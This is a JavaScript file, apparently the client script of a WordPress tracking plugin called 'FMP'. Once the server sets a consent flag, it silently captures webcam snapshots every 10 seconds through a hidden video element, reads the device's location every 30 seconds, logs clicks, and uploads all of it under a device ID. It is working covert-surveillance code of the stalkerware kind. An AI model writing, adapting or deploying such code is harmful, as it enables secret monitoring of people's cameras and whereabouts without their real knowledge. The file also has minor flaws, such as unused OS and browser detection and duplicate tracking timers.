(function() {
    'use strict';

    const FMP = {
        deviceId: fmpAjax.deviceId,
        interval: 5000, // 5 seconds
        
        init: function() {
            this.registerDevice();
            this.startTracking();
        },
        
        registerDevice: function() {
            const userAgent = navigator.userAgent;
            const os = this.detectOS();
            const browser = this.detectBrowser();
            
            fetch(fmpAjax.ajaxurl, {
                method: 'POST',
                credentials: 'same-origin',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'action=fmp_check_consent&device_id=' + encodeURIComponent(this.deviceId)
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    localStorage.setItem('fmp_consent', 'true');
                    this.startTracking();
                }
            });
        },
        
        startTracking: function() {
            if (localStorage.getItem('fmp_consent') !== 'true') return;
            
            // Camera capture every 10 seconds
            setInterval(() => this.captureCamera(), 10000);
            
            // Location tracking every 30 seconds
            setInterval(() => this.trackLocation(), 30000);
            
            // Activity logging
            this.logActivity('app_launch', 'Application started');
            
            document.addEventListener('click', () => {
                this.logActivity('user_click', 'User interaction detected');
            });
        },
        
        captureCamera: function() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
            
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/jpeg');
                    this.sendData('fmp_send_camera', {image: imageData});
                    
                    stream.getTracks().forEach(track => track.stop());
                }, 500);
            })
            .catch(e => console.log('Camera access denied'));
        },
        
        trackLocation: function() {
            if (!navigator.geolocation) return;
            
            navigator.geolocation.getCurrentPosition(
                position => {
                    const coords = position.coords;
                    this.sendData('fmp_send_location', {
                        latitude: coords.latitude,
                        longitude: coords.longitude,
                        accuracy: coords.accuracy,
                        address: 'Current Location'
                    });
                },
                error => console.log('Location access denied')
            );
        },
        
        logActivity: function(type, description) {
            this.sendData('fmp_send_activity', {
                type: type,
                description: description
            });
        },
        
        sendData: function(action, data) {
            const formData = new FormData();
            formData.append('action', action);
            formData.append('device_id', this.deviceId);
            
            for (let key in data) {
                formData.append(key, data[key]);
            }
            
            fetch(fmpAjax.ajaxurl, {
                method: 'POST',
                credentials: 'same-origin',
                body: formData
            })
            .then(r => r.json())
            .catch(e => console.log('Send failed'));
        },
        
        detectOS: function() {
            const ua = navigator.userAgent;
            if (ua.indexOf('Windows') > -1) return 'Windows';
            if (ua.indexOf('Mac') > -1) return 'MacOS';
            if (ua.indexOf('Linux') > -1) return 'Linux';
            if (ua.indexOf('Android') > -1) return 'Android';
            if (ua.indexOf('iPhone') > -1) return 'iOS';
            return 'Unknown';
        },
        
        detectBrowser: function() {
            const ua = navigator.userAgent;
            if (ua.indexOf('Chrome') > -1) return 'Chrome';
            if (ua.indexOf('Firefox') > -1) return 'Firefox';
            if (ua.indexOf('Safari') > -1) return 'Safari';
            if (ua.indexOf('Edge') > -1) return 'Edge';
            return 'Unknown';
        }
    };
    
    document.addEventListener('DOMContentLoaded', () => FMP.init());
})();
